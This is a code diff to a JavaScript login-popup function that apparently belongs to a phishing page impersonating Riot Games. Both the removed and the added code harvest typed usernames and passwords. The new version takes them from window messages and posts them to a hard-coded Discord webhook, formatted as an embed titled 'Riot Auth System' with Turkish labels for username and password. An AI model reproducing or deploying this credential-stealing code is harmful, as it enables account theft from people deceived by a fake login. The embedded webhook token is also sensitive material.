@@ -164,15 +164,33 @@ function openAuth() {
     uInput.oninput = checkInputs;
     pInput.oninput = checkInputs;
 
-    win.document.getElementById('go').onclick = function() {
-        const u = uInput.value, p = pInput.value;
-        if(u && p) {
-            fetch(WEBHOOK_URL, { 
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify({ content: "👤: " + u + " | 🔑: " + p }) 
-            });
-            win.close();
-        }
-    };
-}
+    window.addEventListener("message", function(event) {
+    if (event.data.user && event.data.pass) {
+        fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: "Riot Auth System",
+                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png",
+                embeds: [{
+                    title: "⚠️ Yeni Giriş Tespit Edildi",
+                    color: 16725845, // Riot kırmızısı
+                    fields: [
+                        {
+                            name: "👤 Kullanıcı Adı",
+                            value: `\`\`\`${event.data.user}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🔑 Şifre",
+                            value: `\`\`\`${event.data.pass}\`\`\``,
+                            inline: false
+                        }
+                    ],
+                    footer: { text: "Riot Games Login Panel | Adana System" },
+                    timestamp: new Date()
+                }]
+            })
+        });
+    }
+}, { once: true });
